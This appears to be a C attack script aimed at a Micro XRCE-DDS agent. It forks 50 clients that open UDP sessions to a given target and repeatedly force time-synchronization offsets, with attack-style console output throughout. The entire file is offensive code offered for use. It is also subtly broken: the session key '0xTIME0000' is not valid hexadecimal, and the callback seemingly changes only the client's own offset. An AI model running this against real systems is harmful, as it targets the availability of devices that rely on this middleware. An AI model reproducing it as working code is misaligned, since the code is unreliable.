// Compile: gcc attack_time_desync.c -o time_desync -lmicroxrcedds_client -lmicrocdr
#include <uxr/client/client.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

#define NUM_CLIENTS 50

int64_t malicious_offset = 0;

void malicious_time_callback(
        uxrSession* session,
        int64_t current_time,
        int64_t transmit_timestamp,
        int64_t received_timestamp,
        int64_t originate_timestamp,
        void* args)
{
    // Force massive time offset
    malicious_offset += 10000000; // Add 10 seconds each call
    session->time_offset = malicious_offset;
    
    printf("[*] Corrupted time offset to: %ld microseconds (%.2f seconds)\n", 
           malicious_offset, malicious_offset / 1000000.0);
}

void attack_single_client(char* ip, char* port, int client_id) {
    printf("[Client %d] Starting time desync attack...\n", client_id);
    
    // Initialize transport
    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, ip, port)) {
        printf("[Client %d] Failed to init transport\n", client_id);
        return;
    }
    
    // Create session
    uxrSession session;
    uint32_t key = 0xTIME0000 + client_id;
    uxr_init_session(&session, &transport.comm, key);
    
    if (!uxr_create_session(&session)) {
        printf("[Client %d] Failed to create session\n", client_id);
        uxr_close_udp_transport(&transport);
        return;
    }
    
    // Install malicious time callback
    uxr_set_time_callback(&session, malicious_time_callback, NULL);
    
    // Continuously desynchronize
    printf("[Client %d] Desynchronizing time...\n", client_id);
    for (int i = 0; i < 100; i++) {
        uxr_sync_session(&session, 1000);
        usleep(100000); // 100ms
        
        if (i % 10 == 0) {
            printf("[Client %d] Desync iteration %d, offset: %ld us\n", 
                   client_id, i, session.time_offset);
        }
    }
    
    // Cleanup
    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);
    
    printf("[Client %d] Completed\n", client_id);
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    char* port = argv[2];
    
    printf("=== Time Synchronization Desync Attack ===\n");
    printf("Target: %s:%s\n", ip, port);
    printf("Number of malicious clients: %d\n\n", NUM_CLIENTS);
    
    // Launch multiple clients to amplify attack
    for (int i = 0; i < NUM_CLIENTS; i++) {
        pid_t pid = fork();
        
        if (pid == 0) {
            // Child process
            attack_single_client(ip, port, i);
            exit(0);
        } else if (pid < 0) {
            printf("[-] Fork failed for client %d\n", i);
        }
        
        usleep(100000); // Stagger client starts
    }
    
    // Wait for all children
    printf("[*] Waiting for all clients to complete...\n");
    sleep(30);
    
    printf("\n[*] Attack completed\n");
    return 0;
}